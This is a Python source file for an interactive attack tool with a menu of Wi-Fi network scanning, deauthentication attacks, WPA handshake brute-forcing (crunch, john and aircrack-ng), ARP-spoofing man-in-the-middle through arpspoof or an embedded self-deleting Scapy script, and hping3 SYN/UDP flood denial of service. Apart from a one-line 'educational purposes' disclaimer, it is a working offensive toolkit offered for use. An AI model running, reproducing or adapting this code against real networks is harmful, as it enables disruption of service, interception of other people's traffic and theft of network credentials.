try: #Check liblarys
    import psutil
    import subprocess
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Beacon
    import os
except ImportError:
    print("Make sure all the libraries are installed. You can find the libraries at -https://github.com/Mokoko2452/Litle.Hack_Script-s address.")
    exit()
if os.geteuid() != 0:
    print("This script must be run as root!")
    exit()

def sc():
    os.system("clear") #screen clear
app_name = ["airmon-ng","aireplay-ng","crunch","john","hping3","gnome-terminal"]

for i in app_name:#app chechk
    result = subprocess.run(["which", i], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if result.stdout.strip():
        print(f"{i} is installed.")
        sc()
    else:
        print(f"{i} is not installed.")
        print("If you want I can install for you this app (Y/N)")
        app_check = input()
        if app_check.lower() == "y":
            subprocess.run(['apt-get', 'install', i,'-y'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("App downloaded")
        elif app_check.lower() == "n":
            print("When you download app you try later")
            exit()



def menu():
    print("This tool is for educational purposes only. The author is not responsible for any misuse of this script.")
    print("""
    <<<Well come the hack script>>>

    1)Line scan

    2)Deauth Attack

    3)Brute Force Attack

    4)Man-in-the-middle attack

    5)Dos Attack

    0)exit

    """)
    choise = input("Make Choise : ")
    sc()
    return choise



def get_interface_info(): #listing interface
    interface_info = []
    for interface, stats in psutil.net_if_stats().items():
        interface_info.append(interface)
    return interface_info 


def get_interface_mode(interface):#write interfacemode
    try:
        result = subprocess.check_output(['iwconfig', interface], stderr=subprocess.PIPE, text=True)
        for line in result.splitlines():
            if "Mode" in line:
                return line.split()[3]
        return "No mode info available"
    except subprocess.CalledProcessError:
        return "Error: Interface not found or something going wrong!!!"

def interface_lister():#listing and writeing
    for index, i in enumerate(get_interface_info(), start=1):
        print(f"{index}. {i}")

    interfaceIndex = int(input()) - 1
    interfacess = get_interface_info()[interfaceIndex]
    sc()
    return interfacess

def interface_checker():#enable moon mod
    interface = interface_lister()
    interfaceMode = get_interface_mode(interface)

    if interfaceMode.lower() == "mode:monitor":
        print("Targeted network???")
        bssid,ch = scan_wifi(interface)
        

    else :
        print("Your interface is not in monitor mode. Do you want to enable monitor mode ??? (Y/N)")
        modeChange = input()
        if modeChange.lower() == "y" or modeChange.lower() == "yes":
            try:
                subprocess.run(['airmon-ng', 'start',interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print("Your interface is now in Monitor mode.")
                input("Please touch enter for continute...")
                interface=interface_lister()
                print("Targeted network???")
                bssid,ch=scan_wifi(interface)
            except:
                print("Failed to enable monitor mode. Please check your setup.")
                return None
        else:
            print("Press Enter to exit!!!")
            input()
            exit()
    sc()
    return bssid , ch, interface

def scan_wifi(ifaces):
    networks = {}

    def packet_handler(packet):
        if packet.haslayer(Dot11Beacon):

            ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore') if packet[Dot11Elt].info else "Hidden"

            bssid = packet[Dot11].addr2
 
            try:
                channel = int.from_bytes(packet[Dot11Elt:3].info, byteorder='little')
            except Exception:
                channel = "Unknown"

            signal = packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else "N/A"

            if bssid not in networks:
                networks[bssid] = (ssid, channel, signal)

    print("Scanning nearby networks; press (Ctrl+C) to stop.")
    try:
        sniff(prn=packet_handler, iface=ifaces, timeout=20) 
    except KeyboardInterrupt:
        print("\nScan stoped.")


    print("\nFined Networks:")
    print("{:<3} {:<20} {:<30} {:<10} {:<10}".format("No", "BSSID", "SSID", "Channel", "Signal"))
    print("-" * 80)
    networks_list = list(networks.items())
    for index, (bssid, info) in enumerate(networks_list, 1):
        ssid, channel, signal = info
        print("{:<3} {:<20} {:<30} {:<10} {:<10}".format(index, bssid, ssid, channel, signal))
    

    try:
        choice = int(input("\nEnter its number to select a network: "))
        if 1 <= choice <= len(networks_list):
            selected_bssid, selected_info = networks_list[choice - 1]
            ssid, channel, signal = selected_info
        
            return selected_bssid, channel
        else:
            print("Invalid selection! Please enter a valid number.")
            return None, None
        
    except ValueError:
        print("Please enter a valid number.")
        return None, None



def comand_terminal(comand): #call comand
    subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f'{comand}; exec bash'])

def chanel_lock(interface,ch): # lock interface chanell
    subprocess.run(['airmon-ng', 'start',interface,str(ch)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def run_attack_in_new_terminal(aPip, targetip):
    #another hack script
    script_code = f'''#!/usr/bin/env python3
import time
import os
import sys
from scapy.all import *

def mackfind(ip):
    try : 
        wantpack=ARP(pdst=ip)
        appack=Ether(dst="ff:ff:ff:ff:ff:ff")   
        pack=appack/wantpack

        npack=srp(pack,timeout=1,verbose=0)[0]
        return npack[0][1].hwsrc
    except IndexError:
        print("Check Ip someting going wrong")
        return None

def apr_anwser(targetip,apip):
        
    targetmac = mackfind(targetip)
    arp_anwers = Ether(dst=targetmac) / ARP(op=2, pdst=targetip, hwdst=targetmac, psrc=apip)
    sendp(arp_anwers,verbose=False)

def reset(targetip,apip):
    targetmac = mackfind(targetip)
    apmac = mackfind(apip)
    arp_anwers = Ether(dst=targetmac) / ARP(op=2, pdst=targetip, hwdst=targetmac, psrc=apip, hwsrc=apmac)
    sendp(arp_anwers,verbose=False,count=10)

aPip = "{aPip}"
targetip = "{targetip}"

try:
    timer = 0
    while True:
        apr_anwser(targetip,aPip)
        apr_anwser(aPip, targetip)
        timer += 2
        print("\\rSended pack : " + str(timer), end="")
        time.sleep(1)
except KeyboardInterrupt:
    print("\\n Exiting")
    reset(targetip, aPip)
    reset(aPip, targetip)
finally:

    try:
        os.remove(__file__)
        print("Temporary script removed.")
    except Exception as e:
        print("Could not remove temporary file:", e)
'''

    temp_script = "temp_attack_script.py"

    with open(temp_script, "w") as f:
        f.write(script_code)

    if sys.platform != "win32":
        os.chmod(temp_script, 0o755)
    

    if sys.platform.startswith("linux"):

        subprocess.Popen(["gnome-terminal", "--", "python3", os.path.abspath(temp_script)])
    else:
        print("Unsupported platform.")


def master():
    while True:
        try:
            menu1 = menu()
            sc()
            if menu1 == "1":
                bssid , ch , interface = interface_checker()
                comand_terminal(f'airodump-ng --bssid {bssid} -c {ch} {interface}')
            elif menu1 == "2":
                print(""""
                CHOİSE Attack STYLE
                    
                1)AP Attack
                    
                2)CLİENT Attack
                    
                """)
                chooise=input("select number : ")
                sc()
                bssid , ch , interface = interface_checker()
                if chooise == "1":
                    deat = input("How many pack send : ")
                    chanel_lock(interface,ch)
                    comand_terminal(f"aireplay-ng -0 {deat} -a {bssid} {interface} ")
                    sc()
                elif chooise == "2":
                    comand_terminal(f'airodump-ng --bssid {bssid} -c {ch} {interface}')
                    clinet_mac = input("Enter client mac : ")
                    deat = input("How many pack send : ")
                    chanel_lock(interface,ch)
                    comand_terminal(f"aireplay-ng -0 {deat} -a {bssid} -c {clinet_mac} {interface} ")
                    sc()
            elif menu1 == "3":
                bssid , ch , interface = interface_checker()
                print("Enter the minimum length and maximum length of the wordlist!!!")
                minsize=int(input("Minimum Length : "))
                maxsize=int(input("Maximum Lenght : "))
                athpoint=""
                for i in range(int(maxsize)):
                    athpoint+="@"
                handsahke = input("Enter handsahke file loc: ")
                if not handsahke.strip():
                    print("Input cannot be empty!")
                    exit()
                print("""
            CHOİSE Attack STYLE
                    
            1) START NEW Attack

            2) CONTİNUE Attack

            """)
                chooise=input("")
                sc()
                if chooise == "1":
                    savedoc=input("Enter save file name : ")
                    subprocess.Popen(f"crunch {minsize} {maxsize} -t {athpoint} | john --stdin --session={savedoc} --stdout | aircrack-ng -b {bssid} -c {ch} {handsahke} -w -",shell=True)
                elif chooise == "2":
                    recfile=input("Enter .rec file loc : ")
                    subprocess.Popen(f"crunch {minsize} {maxsize} -t {athpoint} | john --restore={recfile} | aircrack-ng -b {bssid} -c {ch} {handsahke} -w -",shell=True)
            elif menu1 == "4":
                interface= interface_lister()
                interfaceMode = get_interface_mode(interface)
                if interfaceMode.lower() == "mode:monitor":
                    print("Your interface is now in monitor mode. Do you want to disable it??? (Y/N) ")
                    aircheck=input()
                    sc()
                    if aircheck.lower() == "y":
                        subprocess.run(['airmon-ng', 'stop',interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        interface= interface_lister()
                    elif aircheck.lower() == "n":
                        print("Script closing")
                        exit()
                    
                subprocess.run(['echo', '1','>','/proc/sys/net/ipv4/ip_forward'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print("""
                CHOİSE Attack STYLE!!!!

                1) Arpspoof tool Attack
                
                2) Scapy Attack

                """)
                mitcoise = input()
                if mitcoise == "1" :
                    hostİP=psutil.net_if_addrs()[interface][0][1]
                    comand_terminal(f"netdiscover -i {interface} -r{hostİP}/24")
                    aPip=input("Enter AP ip : ")
                    targetip = input("Enter Target ip : ")
                    comand_terminal(f"arpspoof -i{interface} -t{aPip} {targetip}")
                    sc()
                elif mitcoise == "2":
                    hostİP=psutil.net_if_addrs()[interface][0][1]
                    comand_terminal(f"netdiscover -i {interface} -r{hostİP}/24")
                    aPip=input("Enter AP ip : ")
                    targetip = input("Enter Target ip : ")
                    run_attack_in_new_terminal(targetip,aPip)
                    sc()
            elif menu1 == "5":
                print("""Choose your DoS attack style!!!
                
                    1 ) TCP Attack
                    
                    2 ) UDP Attack
                    """)
                Dchoise = input()
                if Dchoise == "1" :
                    port = input("Enter Attacked port : ")
                    ipadress=input("Enter Attack ip or url : ")
                    comand_terminal(f"hping3 --flood --syn -p {port} {ipadress}")
                    sc()
                elif Dchoise == "2":
                    port = input("Enter Attacked port : ")
                    ipadress=input("Enter Attack ip or url : ")
                    comand_terminal(f"hping3 --flood --udp -p {port} {ipadress}")
                    sc()
            elif menu1 == "0":
                exit()
            else:
                print("You made wrong choise")
        except ValueError:
            print("Please enter a valid value.")

try: 
    master()
except KeyboardInterrupt:
    print("\nDo you want exit?(Y/N)")
    exitch=input()
    if exitch.lower()=="y":
        exit()
    elif exitch.lower()=="n":
        sc()
        master()